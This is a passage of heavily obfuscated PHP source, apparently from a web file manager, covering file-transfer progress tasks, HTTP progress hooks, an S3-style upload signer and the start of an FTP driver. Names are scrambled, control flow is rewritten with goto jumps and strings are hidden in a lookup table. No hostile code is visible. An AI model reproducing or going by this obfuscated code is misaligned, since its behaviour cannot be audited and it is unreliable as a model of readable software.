self::taskListUser(USER_ID); } public static function taskListUser($F¡•÷ê¶£¥ = false) { goto E˜™æÒõ†; Fè¯ÏêŒõî: return $aÎŞä”Ûôê; goto aîœ›ùÁÆí; AÒ†æ‹Ç™Õ: $aÎŞä”Ûôê = Model($E²¦ÜÓ…Å÷[425])->where($c´ùÁ¿ŠÈæ)->select(); $aÎŞä”Ûôê = $aÎŞä”Ûôê ? $aÎŞä”Ûôê : array(); foreach ($aÎŞä”Ûôê as $eéÕœæ¤“ => $f‰ÚµÍ¢ÊÂ) { $aÎŞä”Ûôê[$eéÕœæ¤“] = json_decode($f‰ÚµÍ¢ÊÂ[$E²¦ÜÓ…Å÷[372]], !0); } goto Fè¯ÏêŒõî; E˜™æÒõ†: $E²¦ÜÓ…Å÷ =& $_SERVER[œº]; $c´ùÁ¿ŠÈæ = array($E²¦ÜÓ…Å÷[29] => $E²¦ÜÓ…Å÷[1549]); if ($F¡•÷ê¶£¥) { $c´ùÁ¿ŠÈæ[$E²¦ÜÓ…Å÷[1528]] = $F¡•÷ê¶£¥; } goto AÒ†æ‹Ç™Õ; aîœ›ùÁÆí: } public static function valueSet($b©‰Ü¾“, $c…»™Ç÷æŒ) { goto B…Íô ÔÃ­; B…Íô ÔÃ­: $bÈì–¾çÚ¾ =& $_SERVER[œº]; if (!$c…»™Ç÷æŒ) { return Model($bÈì–¾çÚ¾[425])->where(array($bÈì–¾çÚ¾[93] => $b©‰Ü¾“, $bÈì–¾çÚ¾[29] => $bÈì–¾çÚ¾[1549]))->delete(); } $fÓë„ƒ„¢ = json_encode($c…»™Ç÷æŒ); goto Cğ†êã•éá; Cğ†êã•éá: if (!$fÓë„ƒ„¢) { ob_start(); var_dump($c…»™Ç÷æŒ); $fºÊ­×‡á = ob_get_clean(); self::log($bÈì–¾çÚ¾[1550] . json_encode_force($fºÊ­×‡á)); } if (!$b©‰Ü¾“ || !$c…»™Ç÷æŒ[$bÈì–¾çÚ¾[393]]) { return !1; } $EÙš’Ëº™ = array($bÈì–¾çÚ¾[29] => $bÈì–¾çÚ¾[1549], $bÈì–¾çÚ¾[1528] => USER_ID, $bÈì–¾çÚ¾[93] => $b©‰Ü¾“, $bÈì–¾çÚ¾[372] => $fÓë„ƒ„¢); goto Cëºİ™ÖÁÏ; Cëºİ™ÖÁÏ: Model($bÈì–¾çÚ¾[425])->add($EÙš’Ëº™, array(), !0); goto D¦ñ©¦Çñ; D¦ñ©¦Çñ: } public static function log($cÒ‡å¬à„°) { if (!GLOBAL_DEBUG) { return; } write_log($cÒ‡å¬à„°, $_SERVER[œº][1551]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto f—ª©Á‚ÄÕ; Fœµ«°¼Ë: Hook::bind($E¶¸Ïåö[566], array($this, $E¶¸Ïåö[1557])); Hook::bind($E¶¸Ïåö[567], array($this, $E¶¸Ïåö[1558])); Hook::bind($E¶¸Ïåö[569], array($this, $E¶¸Ïåö[1559])); goto fù¦ ¶Ø‡ñ; A°ÓœÁ²º­: Hook::bind($E¶¸Ïåö[1561], array($this, $E¶¸Ïåö[1562])); Hook::bind($E¶¸Ïåö[559], array($this, $E¶¸Ïåö[1563])); $this->sourceModelCopyFlag = !1; goto c¥±ŠŞ³“; bœ¡Ñ„®½: Hook::bind($E¶¸Ïåö[539], array($this, $E¶¸Ïåö[1560])); Hook::bind($E¶¸Ïåö[541], array($this, $E¶¸Ïåö[1560])); Hook::bind($E¶¸Ïåö[543], array($this, $E¶¸Ïåö[1560])); goto A°ÓœÁ²º­; C…ß½åÄ«ß: Hook::bind($E¶¸Ïåö[1552], array($this, $E¶¸Ïåö[1553])); Hook::bind($E¶¸Ïåö[1110], array($this, $E¶¸Ïåö[1554])); Hook::bind($E¶¸Ïåö[1555], array($this, $E¶¸Ïåö[1556])); goto Fœµ«°¼Ë; f—ª©Á‚ÄÕ: $E¶¸Ïåö =& $_SERVER[œº]; $cõŠÓä£‘¡ =& $this->task; $this->sourceCopyFolder = !1; goto C…ß½åÄ«ß; AÊÖâ›œŸÉ: $cõŠÓä£‘¡[$E¶¸Ïåö[1576]] = 0; $cõŠÓä£‘¡[$E¶¸Ïåö[1577]] = 0; if (!$cõŠÓä£‘¡[$E¶¸Ïåö[1432]]) { $cõŠÓä£‘¡[$E¶¸Ïåö[1432]] = LNG($E¶¸Ïåö[1578]); } goto B·•Ò·•âÆ; Aà»ğˆÔÏ‘: $cõŠÓä£‘¡[$E¶¸Ïåö[1570]] = LNG($E¶¸Ïåö[1571]); $cõŠÓä£‘¡[$E¶¸Ïåö[1572]] = 0; $cõŠÓä£‘¡[$E¶¸Ïåö[1573]] = 0; goto CÒ¥­“…£‘; c¥±ŠŞ³“: Hook::bind($E¶¸Ïåö[1564], array($this, $E¶¸Ïåö[1565])); Hook::bind($E¶¸Ïåö[1566], array($this, $E¶¸Ïåö[1567])); Hook::bind($E¶¸Ïåö[1568], array($this, $E¶¸Ïåö[1569])); goto Aà»ğˆÔÏ‘; fù¦ ¶Ø‡ñ: Hook::bind($E¶¸Ïåö[570], array($this, $E¶¸Ïåö[1559])); Hook::bind($E¶¸Ïåö[537], array($this, $E¶¸Ïåö[1560])); Hook::bind($E¶¸Ïåö[534], array($this, $E¶¸Ïåö[1560])); goto bœ¡Ñ„®½; CÒ¥­“…£‘: $cõŠÓä£‘¡[$E¶¸Ïåö[1023]] = $E¶¸Ïåö[33]; $cõŠÓä£‘¡[$E¶¸Ïåö[1574]] = $E¶¸Ïåö[33]; $cõŠÓä£‘¡[$E¶¸Ïåö[1575]] = 0; goto AÊÖâ›œŸÉ; B·•Ò·•âÆ: } protected function endAfter() { goto fÛñìÔÀ‚Ô; EÌÜÍ“‰‹: Hook::unbind($Eéß£ãœ[534], array($this, $Eéß£ãœ[1560])); Hook::unbind($Eéß£ãœ[539], array($this, $Eéß£ãœ[1560])); Hook::unbind($Eéß£ãœ[541], array($this, $Eéß£ãœ[1560])); goto EË•¨Ùèã¼; BˆŒ·ÄËØ : Hook::unbind($Eéß£ãœ[569], array($this, $Eéß£ãœ[1559])); Hook::unbind($Eéß£ãœ[570], array($this, $Eéß£ãœ[1559])); Hook::unbind($Eéß£ãœ[537], array($this, $Eéß£ãœ[1560])); goto EÌÜÍ“‰‹; EË•¨Ùèã¼: Hook::unbind($Eéß£ãœ[543], array($this, $Eéß£ãœ[1560])); Hook::unbind($Eéß£ãœ[1561], array($this, $Eéß£ãœ[1562])); Hook::unbind($Eéß£ãœ[559], array($this, $Eéß£ãœ[1563])); goto FÙÙ­ÚÕé“; fÛñìÔÀ‚Ô: $Eéß£ãœ =& $_SERVER[œº]; Hook::unbind($Eéß£ãœ[1552], array($this, $Eéß£ãœ[1553])); Hook::unbind($Eéß£ãœ[1110], array($this, $Eéß£ãœ[1554])); goto AºËÒ÷Ã; AºËÒ÷Ã: Hook::unbind($Eéß£ãœ[1555], array($this, $Eéß£ãœ[1556])); Hook::unbind($Eéß£ãœ[566], array($this, $Eéß£ãœ[1557])); Hook::unbind($Eéß£ãœ[567], array($this, $Eéß£ãœ[1558])); goto BˆŒ·ÄËØ ; FÙÙ­ÚÕé“: Hook::unbind($Eéß£ãœ[1564], array($this, $Eéß£ãœ[1565])); Hook::unbind($Eéß£ãœ[1566], array($this, $Eéß£ãœ[1567])); Hook::unbind($Eéß£ãœ[1568], array($this, $Eéß£ãœ[1569])); goto b„ĞáÓ¼’È; b„ĞáÓ¼’È: } public function copyMoveStart($eİ–Åßô‡, $f¨–Üòˆ†Ú, $AÁÁ¯Ğ‰‡“, $c•ÃÓ³¼İó) { goto Aİ“®¬ğš«; Aİ“®¬ğš«: $bêêãòœ Ú =& $_SERVER[œº]; self::log($bêêãòœ Ú[1579] . $f¨–Üòˆ†Ú . $bêêãòœ Ú[67] . $c•ÃÓ³¼İó); $fÂÆ¢»¨Ñ„ = rtrim(TEMP_FILES, $bêêãòœ Ú[8]); goto BÂ‰å’Úœ‚; A™Ö¥ç¼²å: $dÏĞÉå¯Êà[$bêêãòœ Ú[1580]] = KodIO::transferType($eİ–Åßô‡, $AÁÁ¯Ğ‰‡“); $this->update(); goto aĞºÛ‰£; BÂ‰å’Úœ‚: if (substr($f¨–Üòˆ†Ú, 0, strlen($fÂÆ¢»¨Ñ„)) == $fÂÆ¢»¨Ñ„) { return; } if (substr($c•ÃÓ³¼İó, 0, strlen($fÂÆ¢»¨Ñ„)) == $fÂÆ¢»¨Ñ„) { return; } $dÏĞÉå¯Êà =& $this->task; goto A™Ö¥ç¼²å; aĞºÛ‰£: } public function updateAfter() { goto b èÉá„ëƒ; Eçƒé‡·Ş¶: $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1529]] = $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1577]] / $d£›°ÊäÅÛ[$C¶ùôè¯²¦[723]]; if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1529]] > 0) { $a˜ŒÍˆöÃ = timeFloat() - $d£›°ÊäÅÛ[$C¶ùôè¯²¦[749]] - $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1532]]; $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1533]] = $a˜ŒÍˆöÃ * (1 - $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1529]]) / $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1529]]; } goto Eò¤Î§³Ô–; b èÉá„ëƒ: $C¶ùôè¯²¦ =& $_SERVER[œº]; $d£›°ÊäÅÛ =& $this->task; if (!$d£›°ÊäÅÛ[$C¶ùôè¯²¦[723]]) { return; } goto A²ì¶ÂÈÁ¦; A²ì¶ÂÈÁ¦: if ($this->sourceModelCopyFlag) { return; } if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1580]] == $C¶ùôè¯²¦[1183]) { return; } if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1580]] == $C¶ùôè¯²¦[1094] || $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1580]] == $C¶ùôè¯²¦[107]) { if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1574]]) { $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1577]] = $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1576]] + $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1573]]; } } else { if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1580]] == $C¶ùôè¯²¦[1184]) { if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1574]] == $C¶ùôè¯²¦[1094]) { $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1577]] = $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1576]] + $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1573]] * 0.5; } else { if ($d£›°ÊäÅÛ[$C¶ùôè¯²¦[1574]] == $C¶ùôè¯²¦[107]) { $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1577]] = $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1576]] + $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1572]] * 0.5 + $d£›°ÊäÅÛ[$C¶ùôè¯²¦[1573]] * 0.5; } } } } goto Eçƒé‡·Ş¶; Eò¤Î§³Ô–: } public function addPath($d·½ñ‹˜£) { goto EİÌ•¿Âîƒ; EİÌ•¿Âîƒ: $Dêñ•ëáÀ„ =& $_SERVER[œº]; if (!$d·½ñ‹˜£) { return; } $E«ç¥õ‰ù =& $this->task; goto CÁ„¤ùŠÕº; CÁ„¤ùŠÕº: $c£äíÏ‡Ş = IO::infoWithChildren($d·½ñ‹˜£); $B¾‡öïÖÆ• = $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1581]] ? $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1581]][$Dêñ•ëáÀ„[1582]] : 0; $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1581]] = array($Dêñ•ëáÀ„[1582] => $B¾‡öïÖÆ• + 1, $Dêñ•ëáÀ„[413] => $c£äíÏ‡Ş[$Dêñ•ëáÀ„[28]], $Dêñ•ëáÀ„[76] => $c£äíÏ‡Ş[$Dêñ•ëáÀ„[76]], $Dêñ•ëáÀ„[495] => $c£äíÏ‡Ş[$Dêñ•ëáÀ„[495]] ? $c£äíÏ‡Ş[$Dêñ•ëáÀ„[495]] : $c£äíÏ‡Ş[$Dêñ•ëáÀ„[76]]); goto a‘¾ê¸çà; a‘¾ê¸çà: if ($c£äíÏ‡Ş[$Dêñ•ëáÀ„[29]] == $Dêñ•ëáÀ„[193]) { $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1021]] += 1; } else { $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1021]] += $c£äíÏ‡Ş[$Dêñ•ëáÀ„[81]][$Dêñ•ëáÀ„[79]]; if ($c£äíÏ‡Ş[$Dêñ•ëáÀ„[395]]) { $E«ç¥õ‰ù[$Dêñ•ëáÀ„[1021]] += $c£äíÏ‡Ş[$Dêñ•ëáÀ„[81]][$Dêñ•ëáÀ„[80]] + 1; } } $E«ç¥õ‰ù[$Dêñ•ëáÀ„[723]] += $c£äíÏ‡Ş[$Dêñ•ëáÀ„[78]]; $this->update(); goto aÓ„‰ŠÍŸŒ; aÓ„‰ŠÍŸŒ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($bˆ¦’àÏİç) { $B®ÏÒš«Û =& $_SERVER[œº]; $D…¡ö×èå† =& $this->task; $D…¡ö×èå†[$B®ÏÒš«Û[1570]] = $bˆ¦’àÏİç[$B®ÏÒš«Û[28]]; $D…¡ö×èå†[$B®ÏÒš«Û[1023]] = $bˆ¦’àÏİç[$B®ÏÒš«Û[28]]; $this->update(); } public function copyFileStart($dù‰‘Ó¢ğ‚, $a¥ŸİÑİ¬, $fŒËá‘Œ×, $D–Ñï¥ñò, $b¥šö´Ø‘’, $F‡ÉÚÒ½‰î) { goto DĞÁ¶ì–ï†; d÷­‘ÔØã: $this->update(); goto b’æ¡ÍéóŸ; fËø”š‘: $GLOBALS[$aì³¡ä¦˜ô[1584]] = $b¥šö´Ø‘’; $GLOBALS[$aì³¡ä¦˜ô[1583]] = $F‡ÉÚÒ½‰î; $A®¬•ğÙ¹‰ =& $this->task; goto fßµ½Ô˜„´; fßµ½Ô˜„´: $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1570]] = $Bã‘§†Ï©; $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1572]] = (int) $dù‰‘Ó¢ğ‚->size($a¥ŸİÑİ¬); $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1573]] = 0; goto BÌÔƒŞŒ§ë; BÌÔƒŞŒ§ë: $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1023]] = $aì³¡ä¦˜ô[33]; $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1574]] = $aì³¡ä¦˜ô[33]; $A®¬•ğÙ¹‰[$aì³¡ä¦˜ô[1575]] = 0; goto d÷­‘ÔØã; DĞÁ¶ì–ï†: $aì³¡ä¦˜ô =& $_SERVER[œº]; $Bã‘§†Ï© = $b¥šö´Ø‘’; if ($Bã‘§†Ï© == $GLOBALS[$aì³¡ä¦˜ô[1583]]) { $Bã‘§†Ï© = $GLOBALS[$aì³¡ä¦˜ô[1584]]; } goto fËø”š‘; b’æ¡ÍéóŸ: } public function copyFileEnd($CğéÌ„¥«, $a¤¤ĞøÈ—, $A†œ«ÆŒÖ, $aç´Êë†‡‡, $B½ø¸´‰ğ¸, $EÍî˜ëñá) { $D¼ìŸ÷÷‰ =& $_SERVER[œº]; $cê§Á¡ê³ =& $this->task; $cê§Á¡ê³[$D¼ìŸ÷÷‰[1573]] = $cê§Á¡ê³[$D¼ìŸ÷÷‰[1572]]; $cê§Á¡ê³[$D¼ìŸ÷÷‰[1574]] = $D¼ìŸ÷÷‰[33]; if ($B½ø¸´‰ğ¸ == $cê§Á¡ê³[$D¼ìŸ÷÷‰[1570]]) { $cê§Á¡ê³[$D¼ìŸ÷÷‰[1576]] += $cê§Á¡ê³[$D¼ìŸ÷÷‰[1572]]; $cê§Á¡ê³[$D¼ìŸ÷÷‰[1577]] = $cê§Á¡ê³[$D¼ìŸ÷÷‰[1576]]; $this->update(1); } else { $this->update(); $cê§Á¡ê³[$D¼ìŸ÷÷‰[1573]] = 0; } self::log($D¼ìŸ÷÷‰[1585] . $a¤¤ĞøÈ— . $D¼ìŸ÷÷‰[67] . $aç´Êë†‡‡ . $D¼ìŸ÷÷‰[229] . $B½ø¸´‰ğ¸ . $D¼ìŸ÷÷‰[1586] . $cê§Á¡ê³[$D¼ìŸ÷÷‰[1570]]); } public function updateFileEnd($C†Ö²ˆæŠİ, $b‰ì¸°Âé) { goto Dæä¼©Ö•; f¶¹‚½»œˆ: $cŸ¶ÆØæËš[$d¤ŠÊõÅïÆ[1572]] = $b‰ì¸°Âé; $cŸ¶ÆØæËš[$d¤ŠÊõÅïÆ[1576]] += $b‰ì¸°Âé; $cŸ¶ÆØæËš[$d¤ŠÊõÅïÆ[1577]] = $cŸ¶ÆØæËš[$d¤ŠÊõÅïÆ[1576]]; goto Eé˜²†åó…; Eé˜²†åó…: $this->update(1); self::log($d¤ŠÊõÅïÆ[1587] . $C†Ö²ˆæŠİ); goto D’¿†Ö®ø; Dæä¼©Ö•: $d¤ŠÊõÅïÆ =& $_SERVER[œº]; $cŸ¶ÆØæËš =& $this->task; $cŸ¶ÆØæËš[$d¤ŠÊõÅïÆ[1570]] = $C†Ö²ˆæŠİ; goto f¶¹‚½»œˆ; D’¿†Ö®ø: } public function sourceModelCopy($cŞ¶œš™¼®) { goto díïİöŒ³; aÜ‘›Å¸›±: $dëæ‘Õå« =& $this->task; $this->sourceModelCopyFlag = !0; $cßó¬‚Ú½Ï = 0; goto Eí«õõ¾î„; Eí«õõ¾î„: switch ($C­õ–åÑã) { case $DÁ™ËßÈ˜[535]: $cßó¬‚Ú½Ï = 1; break; case $DÁ™ËßÈ˜[538]: $dëæ‘Õå«[$DÁ™ËßÈ˜[1570]] = $F‡¿ ÓÓ×â[$DÁ™ËßÈ˜[28]]; break; case $DÁ™ËßÈ˜[540]: $cßó¬‚Ú½Ï = intval($cŞ¶œš™¼®[$DÁ™ËßÈ˜[377]] * 0.4); break; case $DÁ™ËßÈ˜[542]: $cßó¬‚Ú½Ï = intval($cŞ¶œš™¼®[$DÁ™ËßÈ˜[377]] * 0.2); break; case $DÁ™ËßÈ˜[544]: $cßó¬‚Ú½Ï = intval($cŞ¶œš™¼®[$DÁ™ËßÈ˜[377]] * 0.4); break; } $this->update($cßó¬‚Ú½Ï); $this->sourceModelCopyFlag = !1; goto b­Ñ¥¶¤¡Š; díïİöŒ³: $DÁ™ËßÈ˜ =& $_SERVER[œº]; $C­õ–åÑã = $cŞ¶œš™¼®[0]; $F‡¿ ÓÓ×â = $cŞ¶œš™¼®[1]; goto aÜ‘›Å¸›±; b­Ñ¥¶¤¡Š: } public function sourceRemove($B­ñÒæÂ´‚, $FÊ÷Ş˜¹”†) { $Bôö•×Ï¡÷ =& $_SERVER[œº]; $this->sourceModelCopyFlag = !0; $b… Œ»˜¬¾ = 1; if (isset($B­ñÒæÂ´‚[$Bôö•×Ï¡÷[81]])) { $b… Œ»˜¬¾ = $B­ñÒæÂ´‚[$Bôö•×Ï¡÷[81]][$Bôö•×Ï¡÷[79]] + $B­ñÒæÂ´‚[$Bôö•×Ï¡÷[81]][$Bôö•×Ï¡÷[80]] + 1; } $this->update($b… Œ»˜¬¾); $this->sourceModelCopyFlag = !1; } public function sourceMove($B­”æ¯¹ÌØ) { $this->sourceRemove($B­”æ¯¹ÌØ, !1); } public function curlProgress($EÄÙ…ÓÏ˜¤, $d”Ÿ¤…Š´, $A°®ºÌÈî, $Có¬ñÁĞ¿‹, $D¹ğ¿íŒ‡„) { $BñÏèøº¿ =& $_SERVER[œº]; $AÄ£×šÊ‰· =& $this->task; if ($D¹ğ¿íŒ‡„ > 0) { $AÄ£×šÊ‰·[$BñÏèøº¿[1023]] = $BñÏèøº¿[1588]; $AÄ£×šÊ‰·[$BñÏèøº¿[1574]] = $BñÏèøº¿[107]; if ($AÄ£×šÊ‰·[$BñÏèøº¿[1572]]) { $AÄ£×šÊ‰·[$BñÏèøº¿[1573]] = $D¹ğ¿íŒ‡„; } if ($AÄ£×šÊ‰·[$BñÏèøº¿[1575]]) { $AÄ£×šÊ‰·[$BñÏèøº¿[1573]] = $D¹ğ¿íŒ‡„ + $AÄ£×šÊ‰·[$BñÏèøº¿[1575]]; } } else { if ($A°®ºÌÈî > 0) { if ($AÄ£×šÊ‰·[$BñÏèøº¿[1572]] == $d”Ÿ¤…Š´) { $AÄ£×šÊ‰·[$BñÏèøº¿[1573]] = $A°®ºÌÈî; $AÄ£×šÊ‰·[$BñÏèøº¿[1023]] = $BñÏèøº¿[1589]; $AÄ£×šÊ‰·[$BñÏèøº¿[1574]] = $BñÏèøº¿[1094]; } } } $this->update(); } public function curlProgressStart($f¡ÁÏêšæ·) { } public function curlProgressEnd($f‚ßÓ¸—’Î) { goto Eâ‰ÓÚã¶ƒ; EÈÍ††ÃŸ: $AÔ†ÃöÜñİ = $BéØĞ¢¤¨ª[$f­™®Ş²‚[1590]]; if ($AÔ†ÃöÜñİ == -1) { $AÔ†ÃöÜñİ = $BéØĞ¢¤¨ª[$f­™®Ş²‚[1591]]; } if ($b‚Ó‡Æ§Ö[$f­™®Ş²‚[1574]] == $f­™®Ş²‚[107] && $AÔ†ÃöÜñİ) { $b‚Ó‡Æ§Ö[$f­™®Ş²‚[1575]] += $AÔ†ÃöÜñİ; } goto a¾•·”ä¡; Eâ‰ÓÚã¶ƒ: $f­™®Ş²‚ =& $_SERVER[œº]; $b‚Ó‡Æ§Ö =& $this->task; $BéØĞ¢¤¨ª = curl_getinfo($f‚ßÓ¸—’Î); goto EÈÍ††ÃŸ; a¾•·”ä¡: $this->update(); goto a…·Ä›áöğ; a…·Ä›áöğ: } } class TaskHttp extends Task { protected function startAfter() { $dç¶«ÊŸ =& $_SERVER[œº]; $bó½Â¹´Õ =& $this->task; $bó½Â¹´Õ[$dç¶«ÊŸ[1592]] = 1; Hook::bind($dç¶«ÊŸ[1564], array($this, $dç¶«ÊŸ[1593])); Hook::bind($dç¶«ÊŸ[1566], array($this, $dç¶«ÊŸ[1594])); Hook::bind($dç¶«ÊŸ[1568], array($this, $dç¶«ÊŸ[1595])); } protected function endAfter() { $BàùˆŞ„´ =& $_SERVER[œº]; Hook::unbind($BàùˆŞ„´[1564], array($this, $BàùˆŞ„´[1593])); Hook::unbind($BàùˆŞ„´[1566], array($this, $BàùˆŞ„´[1594])); Hook::unbind($BàùˆŞ„´[1568], array($this, $BàùˆŞ„´[1595])); } public function progressStart($b‹ª»ŸÖ©Ù) { $dİŠÚÏª¹Ç =& $_SERVER[œº]; $fÖ•½Øá¡© = curl_getinfo($b‹ª»ŸÖ©Ù); self::log($dİŠÚÏª¹Ç[1596] . $fÖ•½Øá¡©[$dİŠÚÏª¹Ç[305]]); self::valueSet($this->task[$dİŠÚÏª¹Ç[393]], $this->task); } public function progressEnd($bêƒ¸¹óö) { $F™¹†Ûî˜Ù =& $_SERVER[œº]; self::log($F™¹†Ûî˜Ù[1597] . $this->task[$F™¹†Ûî˜Ù[393]]); $this->end(); } public function progress($cÎ‚À¸Ï¬Ò, $cöŠÀÛ«ª, $dæ¸‡ä¤î‰, $céÃ¯Èõ”‡, $D¤ÈòöáğŒ) { $Bó«¾ºËä× =& $_SERVER[œº]; $DíÍ°¬œ±» =& $this->task; if ($D¤ÈòöáğŒ > 0) { $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]] = $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]] == 0 ? $céÃ¯Èõ”‡ : $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]]; $DíÍ°¬œ±»[$Bó«¾ºËä×[1036]] = $D¤ÈòöáğŒ; } else { if ($dæ¸‡ä¤î‰ > 0) { $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]] = $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]] == 0 ? $cöŠÀÛ«ª : $DíÍ°¬œ±»[$Bó«¾ºËä×[1021]]; $DíÍ°¬œ±»[$Bó«¾ºËä×[1036]] = $dæ¸‡ä¤î‰; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\163\163\x48\164\164\x70\72\x64\157\167\x6e\72{$dæ¸‡ä¤î‰}\x2f{$cöŠÀÛ«ª}\x3b\40\165\x70\x6c\157\x61\144\72{$D¤ÈòöáğŒ}\57{$céÃ¯Èõ”‡}\x3b"); } } goto b¸æŠ½–…Õ; C—…Ç™‰: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($c³æë‡¤†) { parent::__construct($c³æë‡¤†); $this->signatureVersion($_SERVER[œº][212]); } public function uploadFormData($B½ĞŠ¬ê–‰, $Cã´½Íò¿‹ = 3600) { goto eá«…æÚù; eá«…æÚù: $eòÃ¿ä¼¼ =& $_SERVER[œº]; $e¿†­í¹Á = $eòÃ¿ä¼¼[192]; $dŒÎÑæà÷¨ = $eòÃ¿ä¼¼[1224]; goto B¬ÎÒñ¨; A‘°‰Óğóš: $Fò˜Õ™Õ•˜ = hash_hmac($eòÃ¿ä¼¼[1234], $b‚¥×œŠŠ–, $BÉ¬ï¥÷½´, !0); $F‰Ëİœ‹ßò = hash_hmac($eòÃ¿ä¼¼[1234], $B ·Æ»…œÑ, $Fò˜Õ™Õ•˜, !0); $Bí…¬‚¸Ø = hash_hmac($eòÃ¿ä¼¼[1234], $F“ìğ”„æ§, $F‰Ëİœ‹ßò); goto bÛ £°Âš–; B¬ÎÒñ¨: $b‚¥×œŠŠ– = $eòÃ¿ä¼¼[59]; $D¥‡ÉôÊ¦ = gmdate($eòÃ¿ä¼¼[1225]); $C¢ù™‹ÑŞ¢ = gmdate($eòÃ¿ä¼¼[711]); goto Fô÷ÖçŠÈ¼; dÍ‰ŠŠÓŠ¹: $BÌ˜ªÎ±» = array($this->accessKey, $C¢ù™‹ÑŞ¢, $this->region, $b‚¥×œŠŠ–, $B ·Æ»…œÑ); $a¸à‡ÙŠÏ„ = implode($eòÃ¿ä¼¼[8], $BÌ˜ªÎ±»); $cµÜ‡Äƒ¾î = array($eòÃ¿ä¼¼[1191] => gmdate($eòÃ¿ä¼¼[1190], strtotime($eòÃ¿ä¼¼[1227])), $eòÃ¿ä¼¼[1192] => array(array($eòÃ¿ä¼¼[1194] => $this->bucket), array($eòÃ¿ä¼¼[1193] => $e¿†­í¹Á), array($eòÃ¿ä¼¼[1195], $eòÃ¿ä¼¼[1196], $eòÃ¿ä¼¼[33]), array($eòÃ¿ä¼¼[1195], $eòÃ¿ä¼¼[1228], $eòÃ¿ä¼¼[33]), array($eòÃ¿ä¼¼[1195], $eòÃ¿ä¼¼[1229], $eòÃ¿ä¼¼[33]), array($eòÃ¿ä¼¼[1197] => $fºÏñÇÒ¸ä), array($eòÃ¿ä¼¼[1230] => $a¸à‡ÙŠÏ„), array($eòÃ¿ä¼¼[1231] => $dŒÎÑæà÷¨), array($eòÃ¿ä¼¼[1232] => $D¥‡ÉôÊ¦), array($eòÃ¿ä¼¼[1233] => $F½œó‚”—))); goto añ÷ÏŠ¤ï·; bÛ £°Âš–: $FÑäÄÛÕ” = array($eòÃ¿ä¼¼[211] => $eòÃ¿ä¼¼[33], $eòÃ¿ä¼¼[1236] => $eòÃ¿ä¼¼[33], $eòÃ¿ä¼¼[1193] => $e¿†­í¹Á, $eòÃ¿ä¼¼[1197] => $fºÏñÇÒ¸ä, $eòÃ¿ä¼¼[1201] => $F“ìğ”„æ§, $eòÃ¿ä¼¼[1237] => $a¸à‡ÙŠÏ„, $eòÃ¿ä¼¼[1238] => $dŒÎÑæà÷¨, $eòÃ¿ä¼¼[1239] => $D¥‡ÉôÊ¦, $eòÃ¿ä¼¼[1240] => $F½œó‚”—, $eòÃ¿ä¼¼[1241] => $Bí…¬‚¸Ø, $eòÃ¿ä¼¼[175] => $this->getHost()); return $FÑäÄÛÕ”; goto F‰Éà¸»•ê; añ÷ÏŠ¤ï·: $F“ìğ”„æ§ = base64_encode(json_encode($cµÜ‡Äƒ¾î)); $e†àÈ‡ŠŞ† = hash_hmac($eòÃ¿ä¼¼[1234], $C¢ù™‹ÑŞ¢, $eòÃ¿ä¼¼[1235] . $this->secret, !0); $BÉ¬ï¥÷½´ = hash_hmac($eòÃ¿ä¼¼[1234], $this->region, $e†àÈ‡ŠŞ†, !0); goto A‘°‰Óğóš; Fô÷ÖçŠÈ¼: $B ·Æ»…œÑ = $eòÃ¿ä¼¼[1226]; $F½œó‚”— = $Cã´½Íò¿‹ . $eòÃ¿ä¼¼[33]; $fºÏñÇÒ¸ä = $eòÃ¿ä¼¼[1189]; goto dÍ‰ŠŠÓŠ¹; F‰Éà¸»•ê: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($cÑ¹õ–ù—) { parent::__construct(); if (count($cÑ¹õ–ù—) > 0) { $this->_init($cÑ¹õ–ù—); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($BœçİøÁÜÄ) { $e§Ñ×„Ëì =& $_SERVER[œº]; global $config; $this->appCharset = $config[$e§Ñ×„Ëì[1242]]; $this->systemCharset = $config[$e§Ñ×„Ëì[1243]]; if (isset($BœçİøÁÜÄ[$e§Ñ×„Ëì[1244]]) && $BœçİøÁÜÄ[$e§Ñ×„Ëì[1244]]) { $this->systemCharset = 